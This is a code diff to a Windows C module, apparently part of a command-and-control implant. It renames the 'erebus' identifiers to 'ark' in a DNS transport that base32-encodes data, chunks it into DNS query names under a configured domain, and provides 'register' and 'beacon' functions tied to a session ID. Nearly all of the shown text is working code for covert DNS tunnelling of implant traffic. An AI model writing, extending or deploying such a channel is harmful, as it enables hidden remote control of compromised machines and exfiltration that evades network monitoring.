@@ -6,9 +6,9 @@
 #include <string.h>
 #include <stdio.h>
 
-#include "erebus/config.h"
-#include "erebus/dns_chunk.h"
-#include "erebus/transport.h"
+#include "ark/config.h"
+#include "ark/dns_chunk.h"
+#include "ark/transport.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -134,7 +134,7 @@ static int dns_exchange(dns_ctx *ctx, const uint8_t *req, size_t req_len, const 
     char b32[4096];
     if (!b32_encode(req, req_len, b32, sizeof(b32))) return 0;
 
-    int max_chunk = erebus_dns_max_chunk_len(session_label, ctx->domain);
+    int max_chunk = ark_dns_max_chunk_len(session_label, ctx->domain);
     if (max_chunk <= 0) return 0;
 
     size_t chunks = (strlen(b32) + (size_t)max_chunk - 1) / (size_t)max_chunk;
@@ -150,7 +150,7 @@ static int dns_exchange(dns_ctx *ctx, const uint8_t *req, size_t req_len, const 
         chunk[clen] = '\0';
 
         char qname[512];
-        erebus_dns_build_query(qname, sizeof(qname), (int)i, (int)chunks, chunk, session_label, ctx->domain);
+        ark_dns_build_query(qname, sizeof(qname), (int)i, (int)chunks, chunk, session_label, ctx->domain);
 
         uint8_t *part = NULL;
         size_t part_len = 0;
@@ -172,17 +172,17 @@ static int dns_exchange(dns_ctx *ctx, const uint8_t *req, size_t req_len, const 
     return 1;
 }
 
-static int dns_register(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
+static int dns_register(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
     dns_ctx *ctx = (dns_ctx *)t->ctx;
     return dns_exchange(ctx, req, req_len, "reg", resp, resp_len);
 }
 
-static int dns_beacon(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
+static int dns_beacon(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
     dns_ctx *ctx = (dns_ctx *)t->ctx;
     return dns_exchange(ctx, req, req_len, ctx->session_id, resp, resp_len);
 }
 
-static void dns_destroy(erebus_transport *t) {
+static void dns_destroy(ark_transport *t) {
     dns_ctx *ctx = (dns_ctx *)t->ctx;
     if (ctx) {
         if (ctx->sock != INVALID_SOCKET) closesocket(ctx->sock);
@@ -192,33 +192,33 @@ static void dns_destroy(erebus_transport *t) {
     free(t);
 }
 
-static void dns_set_session_id(erebus_transport *t, const char *session_id) {
+static void dns_set_session_id(ark_transport *t, const char *session_id) {
     dns_ctx *ctx = (dns_ctx *)t->ctx;
     if (!ctx || !session_id) return;
     memset(ctx->session_id, 0, sizeof(ctx->session_id));
     strncpy(ctx->session_id, session_id, sizeof(ctx->session_id) - 1);
 }
 
-static const erebus_transport_ops dns_ops = {
+static const ark_transport_ops dns_ops = {
     dns_register,
     dns_beacon,
     dns_destroy,
     dns_set_session_id,
 };
 
-int erebus_transport_create_dns(erebus_transport **out) {
+int ark_transport_create_dns(ark_transport **out) {
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;
 
-    erebus_transport *t = (erebus_transport *)calloc(1, sizeof(*t));
+    ark_transport *t = (ark_transport *)calloc(1, sizeof(*t));
     dns_ctx *ctx = (dns_ctx *)calloc(1, sizeof(*ctx));
     if (!t || !ctx) { free(t); free(ctx); return 0; }
 
-    strncpy(ctx->domain, EREBUS_DNS_DOMAIN, sizeof(ctx->domain) - 1);
+    strncpy(ctx->domain, ARK_DNS_DOMAIN, sizeof(ctx->domain) - 1);
     if (ctx->domain[0] && ctx->domain[strlen(ctx->domain) - 1] != '.') {
         strncat(ctx->domain, ".", sizeof(ctx->domain) - strlen(ctx->domain) - 1);
     }
-    strncpy(ctx->server, EREBUS_DNS_SERVER[0] ? EREBUS_DNS_SERVER : "8.8.8.8:53", sizeof(ctx->server) - 1);
+    strncpy(ctx->server, ARK_DNS_SERVER[0] ? ARK_DNS_SERVER : "8.8.8.8:53", sizeof(ctx->server) - 1);
 
     char host[64] = "8.8.8.8";
     int port = 53;
